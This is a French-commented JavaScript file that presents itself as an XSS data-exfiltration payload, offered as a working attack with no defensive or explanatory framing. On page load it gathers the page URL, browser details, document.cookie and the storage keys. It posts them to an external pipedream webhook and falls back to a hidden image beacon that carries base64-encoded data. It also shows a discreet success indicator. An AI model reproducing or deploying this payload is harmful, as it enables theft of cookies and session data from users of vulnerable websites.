// ==================================================
// XSS DATA EXFILTRATION PAYLOAD
// Webhook: https://eoj3zpscoeyfiry.m.pipedream.net
// ==================================================

(function() {
    'use strict';
    
    // Attendre que la page soit complètement chargée
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executePayload);
    } else {
        setTimeout(executePayload, 1000);
    }

    function executePayload() {
        console.log('[XSS] Payload activé - Envoi vers webhook');
        
        // Collecter les données
        const data = collectData();
        
        // Envoyer les données au webhook
        sendToWebhook(data);
        
        // Preuve visuelle discrète
        showSuccessIndicator();
    }

    function collectData() {
        return {
            // Informations de la page
            url: window.location.href,
            title: document.title,
            domain: window.location.hostname,
            
            // Informations navigateur
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            
            // Informations écran
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            
            // Cookies (si disponibles)
            cookies: document.cookie || 'no-cookies',
            
            // Référent
            referrer: document.referrer || 'no-referrer',
            
            // Timestamp
            timestamp: new Date().toISOString(),
            
            // Informations supplémentaires
            localStorageKeys: Object.keys(localStorage),
            sessionStorageKeys: Object.keys(sessionStorage),
            
            // Metadata
            payloadVersion: '1.0',
            source: 'XSS-Exfiltration'
        };
    }

    function sendToWebhook(data) {
        const webhookURL = 'https://eoj3zpscoeyfiry.m.pipedream.net';
        
        // Méthode 1: Fetch avec JSON
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-XSS-Payload': 'true'
            },
            body: JSON.stringify(data),
            mode: 'no-cors'
        })
        .then(response => {
            console.log('[XSS] Données envoyées avec succès', data);
        })
        .catch(error => {
            console.error('[XSS] Erreur envoi:', error);
            // Fallback: Méthode 2 avec image tracker
            fallbackSend(data);
        });
    }

    function fallbackSend(data) {
        // Méthode alternative pour contourner CORS
        const encodedData = btoa(JSON.stringify(data));
        const img = new Image();
        img.src = `https://eoj3zpscoeyfiry.m.pipedream.net/?data=${encodedData}&fallback=true`;
        img.style.display = 'none';
        document.body.appendChild(img);
    }

    function showSuccessIndicator() {
        // Indicateur visuel très discret
        const indicator = document.createElement('div');
        indicator.style.cssText = `
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 5px;
            height: 5px;
            background: #00ff00;
            border-radius: 50%;
            z-index: 9999;
            opacity: 0.7;
            pointer-events: none;
        `;
        document.body.appendChild(indicator);
        
        // Supprimer après 5 secondes
        setTimeout(() => {
            indicator.style.opacity = '0';
            setTimeout(() => indicator.remove(), 1000);
        }, 5000);
    }

    // Nettoyage
    window.addEventListener('beforeunload', () => {
        console.log('[XSS] Nettoyage des traces');
    });

})();

// Version minimaliste alternative
console.log('XSS Payload chargé - Webhook active');
